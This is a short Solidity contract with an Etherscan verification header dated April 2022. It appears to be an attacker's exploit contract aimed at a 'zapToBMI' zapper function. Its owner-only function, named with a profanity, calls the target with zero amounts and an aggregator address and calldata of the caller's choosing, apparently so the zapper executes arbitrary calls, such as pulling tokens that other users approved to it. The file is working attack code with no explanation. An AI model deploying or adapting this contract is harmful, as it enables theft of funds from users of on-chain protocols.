/**
 *Submitted for verification at Etherscan.io on 2022-04-13
*/

pragma solidity ^0.8.12;
pragma experimental ABIEncoderV2;
interface tests{

   function zapToBMI(
        address _from,
        uint256 _amount,
        address _fromUnderlying,
        uint256 _fromUnderlyingAmount,
        uint256 _minBMIRecv,
        address[] calldata _bmiConstituents,
        uint256[] calldata _bmiConstituentsWeightings,
        address _aggregator,
        bytes calldata _aggregatorData,
        bool refundDust
   ) external;

}
contract test{
    
    address owner = msg.sender;
    function fuckyou(address vlu,address tokens,bytes memory data,address[] memory addr,uint256[] memory num) external{
        require(msg.sender == owner,"fuckyou!!");
        tests(vlu).zapToBMI(0x853d955aCEf822Db058eb8505911ED77F175b99e,0,0x853d955aCEf822Db058eb8505911ED77F175b99e,0,0,addr,num,tokens,data,false);
    }
}